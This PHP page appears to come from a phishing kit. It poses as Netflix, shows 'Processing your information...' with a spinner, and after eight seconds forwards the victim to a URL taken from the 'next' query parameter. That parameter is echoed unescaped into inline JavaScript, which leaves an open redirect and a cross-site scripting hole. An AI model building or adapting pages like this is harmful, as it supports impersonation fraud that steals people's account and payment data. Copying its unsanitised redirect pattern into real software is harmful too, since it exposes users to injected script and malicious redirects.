<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Netflix</title>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png">  </div>
       </header> 

    
    

<main>


<div class="form">
    <div class="continer">
    
<div class="titles_holder" style="padding:10px;">
<h2>Please wait...</h2>
</div>


<div class="heads">
<p>Processing your information...</p>
<div class="loding"><img src="res/img/loadings.gif" style="width:60px;"></div>
 
</div>


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>